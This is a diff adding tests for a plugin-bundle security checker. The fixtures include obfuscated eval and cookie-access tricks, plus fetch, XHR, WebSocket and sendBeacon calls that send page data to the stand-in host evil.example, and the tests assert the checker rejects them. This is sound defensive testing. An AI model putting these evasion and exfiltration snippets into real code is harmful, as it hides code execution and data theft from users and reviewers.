@@ -77,6 +77,153 @@ describe('checkPluginBundle (AGL-426)', () => {
     }
   })
 
+  // The regex checker passed every one of these (AGL-964). They are the
+  // reason the checker parses now: none of them is exotic, and a bundle is
+  // minified by the time it is published, so text matching saw nothing.
+  it('sees through the shapes that hid from the text scan (AGL-964)', () => {
+    for (const evil of [
+      `const g = globalThis; g['ev' + 'al']('fetch(1)')`,
+      `(() => {}).constructor('return 1')()`,
+      `const d = document; d['coo' + 'kie']`,
+      `globalThis['local' + 'Storage'].getItem('k')`,
+      `const u = location.hash; import(u)`,
+      `const w = window; w[key]`,
+      'globalThis.eval("x")',
+    ]) {
+      const result = checkPluginBundle(
+        `export function register() { ${evil} }\n`,
+      )
+      expect([evil, result.ok]).toEqual([evil, false])
+    }
+  })
+
+  it('does not read a comment or a string as code (AGL-964)', () => {
+    // The one thing the regex checker DID flag was its own documentation.
+    const result = checkPluginBundle(
+      `// this plugin does not use eval( anywhere\n` +
+        `const help = 'document.cookie is never touched'\n` +
+        `export function register() { console.log(help) }\n`,
+    )
+    expect(result.ok).toBe(true)
+    expect(result.problems).toEqual([])
+  })
+
+  it('leaves ordinary property names on ordinary objects alone', () => {
+    const result = checkPluginBundle(
+      `export function register(host) {\n` +
+        `  const response = host.get()\n` +
+        `  return [response.cookie, response.localStorage, host.state[key]]\n` +
+        `}\n`,
+    )
+    expect(result.ok).toBe(true)
+    expect(result.problems).toEqual([])
+  })
+
+  it('rejects a bundle it cannot parse', () => {
+    const result = checkPluginBundle('export function register() { <<< }\n')
+    expect(result.ok).toBe(false)
+    expect(result.problems.some((p) => p.message.includes('does not parse'))).toBe(
+      true,
+    )
+  })
+
+  describe('network calls vs declared capabilities (AGL-964)', () => {
+    const bundle = (body: string) =>
+      `export function register() { ${body} }\n`
+
+    it('rejects a network call when the manifest declares no network', () => {
+      const result = checkPluginBundle(
+        bundle(`fetch('https://evil.example', { body: document.title })`),
+        { declaredNetwork: [] },
+      )
+      expect(result.ok).toBe(false)
+      expect(
+        result.problems.some((p) => p.message.includes('no network capability')),
+      ).toBe(true)
+    })
+
+    it('rejects an origin the manifest does not declare', () => {
+      const result = checkPluginBundle(
+        bundle(`fetch('https://evil.example/collect')`),
+        { declaredNetwork: ['https://api.example.com'] },
+      )
+      expect(result.ok).toBe(false)
+      expect(
+        result.problems.some((p) => p.message.includes('https://evil.example')),
+      ).toBe(true)
+    })
+
+    it('accepts a declared origin', () => {
+      const result = checkPluginBundle(
+        bundle(`fetch('https://api.example.com/v1/x')`),
+        { declaredNetwork: ['https://api.example.com'] },
+      )
+      expect(result.ok).toBe(true)
+    })
+
+    it('warns rather than fails on a URL only known at runtime', () => {
+      const result = checkPluginBundle(bundle(`fetch(url)`), {
+        declaredNetwork: ['https://api.example.com'],
+      })
+      expect(result.ok).toBe(true)
+      expect(result.problems[0].level).toBe('warning')
+    })
+
+    it('catches XHR, WebSocket and sendBeacon too', () => {
+      for (const evil of [
+        `new XMLHttpRequest().open('POST', 'https://evil.example')`,
+        `new WebSocket('wss://evil.example')`,
+        `navigator.sendBeacon('https://evil.example', 'x')`,
+      ]) {
+        const result = checkPluginBundle(bundle(evil), { declaredNetwork: [] })
+        expect([evil, result.ok]).toEqual([evil, false])
+      }
+    })
+
+    it('only warns when nobody told it what was declared', () => {
+      // A checker that was never given the manifest cannot claim a call is
+      // undeclared — the review page re-runs verdicts for old versions.
+      const result = checkPluginBundle(bundle(`fetch('https://evil.example')`))
+      expect(result.ok).toBe(true)
+      expect(result.problems[0].level).toBe('warning')
+    })
+  })
+
+  describe('obfuscation heuristics (AGL-964)', () => {
+    it('warns about machine-obfuscated identifiers without failing', () => {
+      const names = Array.from(
+        { length: 6 },
+        (_, index) => `const _0xdead0${index} = ${index}`,
+      ).join('\n')
+      const result = checkPluginBundle(
+        `${names}\nexport function register() { return _0xdead00 }\n`,
+      )
+      expect(result.ok).toBe(true)
+      expect(
+        result.problems.some((p) => p.message.includes('machine-obfuscated')),
+      ).toBe(true)
+    })
+
+    it('warns about a large embedded base64 literal', () => {
+      const result = checkPluginBundle(
+        `const blob = '${'QUJDREVG'.repeat(200)}'\n` +
+          `export function register() { return blob }\n`,
+      )
+      expect(result.ok).toBe(true)
+      expect(result.problems.some((p) => p.message.includes('base64'))).toBe(true)
+    })
+
+    it('warns about an unreadable single line', () => {
+      const result = checkPluginBundle(
+        `export function register() { const x = '${'a'.repeat(120_000)}'; return x }\n`,
+      )
+      expect(result.ok).toBe(true)
+      expect(
+        result.problems.some((p) => p.message.includes('character line')),
+      ).toBe(true)
+    })
+  })
+
   it('rejects empty and oversized bundles', () => {
     expect(checkPluginBundle('').ok).toBe(false)
     const result = checkPluginBundle(
